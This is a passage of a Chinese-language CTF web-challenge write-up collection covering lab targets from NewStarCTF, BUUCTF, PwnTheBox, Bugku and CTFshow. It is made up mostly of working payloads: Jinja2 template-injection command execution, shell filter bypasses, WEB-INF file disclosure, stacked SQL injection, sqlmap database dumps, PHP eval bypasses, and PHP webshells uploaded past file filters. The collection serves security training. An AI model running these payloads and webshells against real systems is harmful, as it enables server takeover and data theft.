'asyncio.locks._ContextManagerMixin'>, <class 'asyncio.locks.Event'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'asyncio.queues.Queue'>, <class 'asyncio.streams.StreamWriter'>, <class 'asyncio.streams.StreamReader'>, <class 'asyncio.subprocess.Process'>, <class 'asyncio.transports.BaseTransport'>, <class 'asyncio.sslproto._SSLPipe'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'jinja2.asyncsupport.AsyncLoopContextIterator'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'jinja2.debug.TracebackFrameProxy'>, <class 'jinja2.debug.ProcessedTraceback'>"
all_class = all_class.split(',')
for n in range(len(all_class)):
	if 'os' in all_class[n]:
		print('{} {}'.format(n, all_class[n]))
'''
87  <class 'posix.ScandirIterator'>
88  <class 'posix.DirEntry'>
117  <class 'os._wrap_close'>
260  <class 'tempfile._TemporaryFileCloser'>
475  <class 'werkzeug.wsgi.ClosingIterator'>
'''
```

执行命令，发现有一些命令的`cat`、`flag`等关键字被过滤。

```
?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('id').read()}}

Welcome to NewStarCTF, Dear uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

简单绕过后即可读取`flag`。

```
?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('tail /fla*').read()}}

Welcome to NewStarCTF, Dear flag{396151fa-e31c-480e-be64-0cf2ea27cbe7}
```

------

### So Baby RCE

这题主要考点有：空格绕过、关键字符绕过、斜杠绕过，`...`。

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

空格可以由`${IFS}` 替代，`PWD`可以使用，那么`/`可以这样获得：

```php
expr substr $PWD 1 1
# 绕过空格
$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)
# 获得 / 
/?cmd=expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1
```

`ls`可以看到有个`ffffllllaaaaggggg`文件：

```
ls /

/?cmd=ls${IFS}$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)

bin boot dev etc ffffllllaaaaggggg home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
```

`cat`和`fl`被过滤了，所以得绕过去才能拿到`flag{3268a104-6cc6-4efe-b09e-600ce18dc594}`。

```
/?cmd=file${IFS}$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)ffff$1llllaaaaggggg

flag{3268a104-6cc6-4efe-b09e-600ce18dc594}
```

------

### [RoarCTF 2019]Easy Java

进入靶机后看到一个登录框，用`Burp Suite`弱密码爆破，发现账户是`admin`，密码是`admin888`。登录进入后看到信息：

> Flag is not here!
>
> 这是一道送分题

白白浪费时间了，点击登录框下方的help，进入到`/Download?filename=help.docx`页面，内容为：

> java.io.FileNotFoundException:{help.docx}

用`HackBar`来构造`POST`请求`/Download?filename=help.docx`，成功下载文件`help.docx`，内容为：

> Are you sure the flag is here? ? ?

题目名字叫做Easy Java，到底Easy在哪儿？`WEB-INF`是`Java`的`WEB`应用的安全目录，如果想在页面中直接访问其中的文件，必须通过`/WEB-INF/web.xml`文件对要访问的文件进行相应映射才能访问。

用`HackBar`来构造`POST`请求`/Download?filename=WEB-INF/web.xml`，下载文件`WEB-INF/web.xml`。我们可以在该文件中看到关键信息：

```xml
<servlet>
	<servlet-name>FlagController</servlet-name>
	<servlet-class>com.wm.ctf.FlagController</servlet-class>
</servlet>
<servlet-mapping>
	<servlet-name>FlagController</servlet-name>
	<url-pattern>/Flag</url-pattern>
</servlet-mapping>
```

`WEB-INF/web.xml`：Web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。

`WEB-INF/database.properties`：数据库配置文件。

`WEB-INF/classes/`：一般用来存放`Java`类文件（`class`）。

`WEB-INF/lib/`：用来存放打包好的库（jar）。

`WEB-INF/src/`：用来放源代码。

所以，`com.wm.ctf.FlagController`的文件路径是`classes/com/wm/ctf/FlagController.class`，构造`POST`请求`/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class`下载。

用`jadx-gui`打开`FlagController.class`查看源码，发现关键变量`flag`。

```java
package defpackage;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "FlagController")
/* loaded from: WEB-INF_classes_com_wm_ctf_FlagController.class */
public class FlagController extends HttpServlet {
    String flag = "ZmxhZ3s1OGViODNjMi1iYTYyLTQ2MGQtYThmNy1lMDc5NzFlOWY4ZWJ9Cg==";

    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        httpServletResponse.getWriter().print("<h1>Flag is nearby ~ Come on! ! !</h1>");
    }
}
```

用`Python`对该字符串进行`base64`解码得到最终的`flag`。

```python
>>> from base64 import b64decode
>>> b64decode('ZmxhZ3s1OGViODNjMi1iYTYyLTQ2MGQtYThmNy1lMDc5NzFlOWY4ZWJ9Cg==')
b'flag{58eb83c2-ba62-460d-a8f7-e07971e9f8eb}\n'
```

------

### [GYCTF2020]Blacklist

靶机关键信息如下：

> ### Black list is so weak for you,isn't it
>
> array(2) {
>   [0]=>
>   string(1) "1"
>   [1]=>
>   string(7) "hahahah"
> }

输入`1'`和`1'--+`提交后可以看到同样的回显，说明这是字符型SQL注入，且闭合字符为`'`。

输入`-1' union select 1,2,3--+`提交后看到：

```sql
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

回显信息表明这些关键字被过滤了。

用`sqlmap`爆破可以发现数据库名称是`supersqli`，但是继续爆破数据表的时候遇到了困难。

尝试堆叠注入，输入`1'; show tables;`提交后看到：

> array(2) {
>   [0]=>
>   string(1) "1"
>   [1]=>
>   string(7) "hahahah"
> }
>
> ------
>
> array(1) {
>   [0]=>
>   string(8) "FlagHere"
> }
> array(1) {
>   [0]=>
>   string(5) "words"
> }
>
> ------

输入`1';show columns from FlagHere;`提交后看到：

> array(2) {
>   [0]=>
>   string(1) "1"
>   [1]=>
>   string(7) "hahahah"
> }
>
> ------
>
> array(6) {
>   [0]=>
>   string(4) "flag"
>   [1]=>
>   string(12) "varchar(100)"
>   [2]=>
>   string(2) "NO"
>   [3]=>
>   string(0) ""
>   [4]=>
>   NULL
>   [5]=>
>   string(0) ""
> }
>
> ------

`select`函数被过滤掉了，我们可以使用`handler`。`HANDLER`命令是`MySQL`中的一种特殊命令，它允许用户在底层与表的存储引擎直接交互。我们通过`HANDLER`可以打开一个表，然后逐行读取数据，而不需要使用`SELECT`语句。这种底层的访问方式在某些场景下可以提供更高的性能，尤其是在需要批量处理大量数据的情况下。`HANDLER`命令的使用语法如下：

```sql
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,…)
[ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
[ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ { FIRST | NEXT }
[ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name CLOSE
```

翻译成人话举例就是：

```sql
HANDLER test open;        # 打开test表
HANDLER test read first;  # 阅读test表中第一行内容
handler test read next;   # 阅读test表下一行内容
handler test close;       # 关闭
```

输入`1'; handler FlagHere open f; handler f read first;`提交后看到以下信息：

> array(2) {
>   [0]=>
>   string(1) "1"
>   [1]=>
>   string(7) "hahahah"
> }
>
> ------
>
> array(1) {
>   [0]=>
>   string(42) "flag{f76148f7-48fb-4ee5-81b1-3c24d1bfa3b3}"
> }

当然，完整的写法应该是：

```
1'; handler FlagHere open f; handler f read first; handler f close;
```

这道题能够堆叠注入的原因是因为靶机使用了`mysqli_multi_query($sql1,$sql2);`函数，所以攻击者可以利用分号对`sql`执行语句进行隔断，从而执行新一行的`sql`命令。

------

### BUU SQL COURSE 1

打开靶机后，发现这是一个有登录入口的新闻网。`F11`调试选中`Network`，发现点击测试新闻1的时候，靶机请求了链接`content_detail.php?id=1`，右键`Copy URL`。

尝试用`sqlmap`爆破。

```bash
$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" --current-db
......
current database: 'news'

$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D news --tables
......
Database: news
[2 tables]
+----------+
| admin    |
| contents |
+----------+

$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D news -T admin --columns
......
Database: news
Table: admin
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(128) |
| username | varchar(128) |
+----------+--------------+

$ sqlmap -u "http://024208c1-bb77-4eda-9a40-90f9e73372e7.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D news -T admin -C password --dump
......
Database: news
Table: admin
[1 entry]
+----------------------------------+
| password                         |
+----------------------------------+
| 40724d0c4062f57ca481bd6998bc3893 |
+----------------------------------+
```

将账号`admin`和密码`40724d0c4062f57ca481bd6998bc3893`在登录界面输入，弹出提示框就是需要提交的`flag`。

------

### BUU SQL COURSE 2

打开靶机后发现和上一题的界面相似，先直接用上面的方法尝试，`sqlmap`爆破获取`admin`的密码后在登录界面输入，弹出提示框`false`，继续用`sqlmap`尝试，直接寻找有`flag`的数据库。

```bash
$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" --dbs
......
available databases [6]:
[*] ctftraining
[*] information_schema
[*] mysql
[*] news
[*] performance_schema
[*] test

$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D ctftraining --tables
......
Database: ctftraining
[3 tables]
+-------+
| flag  |
| news  |
| users |
+-------+

$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D ctftraining -T flag --columns
......
Database: ctftraining
Table: flag
[1 column]
+--------+-----------+
| Column | Type      |
+--------+-----------+
| flag   | char(128) |
+--------+-----------+

$ sqlmap -u "http://326fb339-dd1d-4c96-a7c0-a329b0043102.node5.buuoj.cn:81/backend/content_detail.php?id=1" -D ctftraining -T flag -C flag --dump
......
Database: ctftraining
Table: flag
[1 entry]
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{6bc5f3fb-c3b2-4ed5-be7d-d6c6bc112713} |
+--------------------------------------------+
```

提交`flag`即可。

------

## PwnTheBox

### [XSS](https://ce.pwnthebox.com/challenges?type=5&id=673)

打开靶机后可以看到以下内容：

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { echo '
' . $_GET[ 'name' ] . '
'; }
```

通过`GET` 请求获取了一个名为`name`的参数，并进行了输出。

直接访问`?name=flag`可以得到`flag`，提交`PTB{2baa079c-0d7b-45a3-92bc-8dbac59b56cc}`即可。

------

### [Get](https://ce.pwnthebox.com/challenges?type=5&id=657)

打开靶机后可以看到以下内容：

```php
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';

Notice: Undefined index: what in /var/www/html/index.php on line 8
```

通过`GET` 请求获取了一个名为`what`的参数，当满足`$what=='flag'`时即可输出`flag`。

直接访问 `?what=flag`可以得到`flag`，提交`PTB{58625de2-2456-401e-ac43-70bd9cdefb4b}`即可。

------

### [Post](https://ce.pwnthebox.com/challenges?type=5&id=661)

打开靶机后可以看到以下内容：

```php
$what=$_POST['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

通过`POST` 请求获取了一个名为`what`的参数 ，当满足`$what=='flag'`时即可输出`flag`。

利用`HackBar`来构造`POST`请求，填入靶机`URL`后`Enable POST`，`enctype`默认为`application/x-www-form-urlencoded`，在`Body`处输入`what=flag`，点击`EXECUTE`即可得到`flag`，提交`PTB{ec5e177f-729b-4c5d-98e9-3cc1be6a8e11}`即可。

此外，这题还可以使用`curl`来发送`POST`请求，`-d`参数用于发送`POST`请求的数据内容。

```bash
curl -d "what=flag" -X POST 靶机地址
```

使用`-d`参数后，`HTTP`请求会自动加上标头`Content-Type: application/x-www-form-urlencoded`，并自动将请求抓为`POST`方式，因此可以省略`-X POST`，直接写为：

```bash
curl -d "what=flag" 靶机地址
```

------

### [2048](https://ce.pwnthebox.com/challenges?type=5&id=206)

打开靶机后查看源码发现`main2048.js`，查看详情发现有个`gamewin()`函数，在`Console`输入`gamewin()`后弹出提示框，提示框显示的`flag{2O48_1s_fun}`是假`flag`，真正的`flag`在`Console`的输出里，提交`HEBTUCTF{Aaenc0de_1s_FuN}`即可。

------

### [简单的计算器](https://ce.pwnthebox.com/challenges?id=1483)

靶机提供了一个简单的计算器，经过测试，数字和算式都能被计算，但是字母和一些特殊字符不能被解析。查看网页源码，发现关键代码`calc.php?num="+encodeURIComponent($("#content").val())`。

```html
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>简单的计算器</title>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="./libs/bootstrap.min.css">
  <script src="./libs/jquery-3.3.1.min.js"></script>
  <script src="./libs/bootstrap.min.js"></script>
</head>
<body>

<div class="container text-center" style="margin-top:30px;">
  <h2>表达式</h2>
  <form id="calc">
    <div class="form-group">
      <input type="text" class="form-control" id="content" placeholder="输入计算式" data-com.agilebits.onepassword.user-edited="yes">
    </div>
    <div id="result"><div class="alert alert-success">
            </div></div>
    <button type="submit" class="btn btn-primary">计算</button>
  </form>
</div>
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>

</body></html>
```

`calc.php?num="+encodeURIComponent($("#content").val())`中的`encodeURIComponent()`函数：

- 不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。
- 其他字符（比如 ：;/?&=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。

查看`calc.php`，源码如下：

```php+HTML
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

PHP解析字符串的特性如下：

> PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组`_POST`。
> 例如`/?foo=bar`变成`Array([foo] => “bar”)`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。
> 例如`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。
> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
> `/news.php?%20news[id%00=42"+AND+1=0 #`
> 上述PHP语句的参数`%20news[id%00`的值将存储到`$_GET[“news_id”]`中。
> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
> 1.删除空白符
> 2.将某些字符转换为下划线（包括空格）

使用`scandir()`函数返回指定目录中的文件和目录的数组。扫描靶机根目录是`scandir("/")`，但是`/`被过滤了。访问`/calc.php?%20num=scandir("/")`看到`what are you want to do?`。用`scandir(chr(47))`绕过，访问`/calc.php?%20num=scandir(chr(47))`得到`Array`。使用 `var_dump()` 枚举查看数组中的内容，访问`/calc.php?%20num=var_dump(scandir(chr(47)))`看到以下信息，发现`f1agg`！

```php
array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }
```

使用`file_get_contents()`函数将整个文件的内容读入到一个字符串中，`/f1agg`的`ASCII`值为`47, 102, 49, 97, 103, 103`，使用`chr()`得到相应的`ASCII`字符，并用`.`将字符拼接成字符串，`payload`就构造出来啦。

```
/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

得到`PTB{f7c125a9-7e87-438b-be4d-e3a3368b3269}`，提交即可。

------

## Bugku

### xxx二手交易市场

先随便注册一个用户登录上去，然后上传头像这个功能存在文件上传漏洞。

编写`PHP`一句话木马：

```php
<?php @eval($_POST['t0ur1st']); ?>
```

`base64`加密后得到字符串`PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==`。

随便点击一张图片上传，然后修改图片信息为

```
image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
```

可以看到上传成功的响应头信息如下：

```json
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 07 Apr 2024 09:31:29 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.22
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 98

{"code":1,"msg":"保存成功!","data":"\/Uploads\/heads\/8c9898401a38fdad.php","url":"","wait":3}
```

使用蚁剑连接靶机，打开虚拟终端。

```bash
$ find / -name flag*
$ cat /var/www/html/flag
flag{27be6f3753c7a1b12345a7a5a7d1127c}
```

提交`flag{27be6f3753c7a1b12345a7a5a7d1127c}`即可。

------

### 文件上传

编写`PHP`一句话木马：

```php
<?php @eval($_POST['t0ur1st']); ?>
```

点击上传后，可以看到`Burp Suite`的请求如下：

```
POST /index.php HTTP/1.1
Host: 114.67.175.224:12169
Content-Length: 422
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://114.67.175.224:12169
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://114.67.175.224:12169/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
Connection: close

------WebKitFormBoundaryR2qZKqgQHD5pKJDR
Content-Disposition: form-data; name="file"; filename="6.php"
Content-Type: application/octet-stream

<?php @eval($_POST['t0ur1st']); ?>

/*
image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
*/
------WebKitFormBoundaryR2qZKqgQHD5pKJDR
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
```

请求头部的 `Content-Type` 内容，随便改个大写字母过滤掉，比如 `mulTipart/form-data`
所上传的文件后缀改为 `.php4`，依次尝试`php4`，`phtml`，`phtm`，`phps`，`php5`（包括一些字母改变大小写）
请求数据的 `Content-Type` 内容改为 `image/jpeg`。

```
POST /index.php HTTP/1.1
Host: 114.67.175.224:12169
Content-Length: 422
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://114.67.175.224:12169
Content-Type: mulTipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://114.67.175.224:12169/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
Connection: close

------WebKitFormBoundaryR2qZKqgQHD5pKJDR
Content-Disposition: form-data; name="file"; filename="6.php4"
Content-Type: image/jpeg

<?php @eval($_POST['t0ur1st']); ?>

/*
image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
*/
------WebKitFormBoundaryR2qZKqgQHD5pKJDR
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
```

上传成功后可以看到

> Upload Success
> Stored in: [upload/bugku07095101_5795.php4](http://114.67.175.224:12169/upload/bugku07095101_5795.php4)

使用蚁剑连接靶机，打开虚拟终端。

```bash
$ find / -name flag*
$ cat /flag
flag{fbd8c508888c770a01c094a4ba2f4c00}
```

提交`flag{fbd8c508888c770a01c094a4ba2f4c00}`即可。

------

## CTFSHOW

### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)

靶机支持短命令执行但不会回显，审计代码发现关键函数`isSafe()`。

```javascript
function isSafe(cmd)
{
	return cmd.length<=7;
}
```

`ctfshow{26c5c506-d5b9-4fa8-8916-dff74381d313}`

```python
import requests

url = 'http://4a250af8-d2dd-4f75-ac03-9f2edbce2fb6.challenge.ctf.show/'

file = {"file": "#!/bin/sh\ncat /f* > /var/www/html/flag.txt"}
data = {"cmd": ". /t*/*"}
response = requests.post(url+"api/tools.php", files=file, data=data)
if "t*" in response.text:
    print("The command has been executed.")
response = requests.get(url=url+'flag.txt')
if response.status_code == 200:
    print('flag: '+response.text)
else:
    print('error')
```

------

### Base64编码隐藏

进入靶机后看到一个登录界面，右键查看源码可以找到关键字符串`Q1RGe2Vhc3lfYmFzZTY0fQ==`。

```html
<body>
    <div class="login-container">
        <h2>CTFshow Admin Login</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" value="admin" readonly>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            <button type="submit">Login</button>
            <div id="message" class="message"></div>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
        
            const correctPassword = "Q1RGe2Vhc3lfYmFzZTY0fQ==";
            const enteredPassword = document.getElementById('password').value;
            const messageElement = document.getElementById('message');
            
            if (btoa(enteredPassword) === correctPassword) {
                messageElement.textContent = "Login successful! Flag: "+enteredPassword;
                messageElement.className = "message success";
            } else {
                messageElement.textContent = "Login failed! Incorrect password.";
                messageElement.className = "message error";
            }
        });
    </script>
</body>
```

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到`flag`。

```bash
C:\Users\tyd>php -r "var_dump(base64_decode('Q1RGe2Vhc3lfYmFzZTY0fQ=='));"
string(16) "CTF{easy_base64}"
```

------

### HTTP头注入

进入靶机后右键查看网页源码，这道题也出现了上一道题的那个字符串`Q1RGe2Vhc3lfYmFzZTY0fQ==`。

`base64`解码后得到`CTF{easy_base64}`，然而这不是真正的`flag`，而是这道题的`admin`登录密码。

输入账号密码后，看到信息：

> Invalid User-Agent
>
> You must use "ctf-show-brower" browser to access this page

用`HackBar`构造`POST`请求求解吧，访问靶机的`/check.php`，点击`MODIFY HEADER`添加HTTP头，新增User-Agent值为`ctf-show-brower`，在Body填入`username=admin&password=CTF{easy_base64}`。

发送`POST`请求后得到`flag`，提交`CTF{user_agent_inject_success}`即可。

------

### Base64多层嵌套解码

进入靶机后右键查看网页源码，定位关键代码。

```html
<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";

        function validatePassword(input) {
            let encoded = btoa(input);
            encoded = btoa(encoded + 'xH7jK').slice(3);
            encoded = btoa(encoded.split('').reverse().join(''));
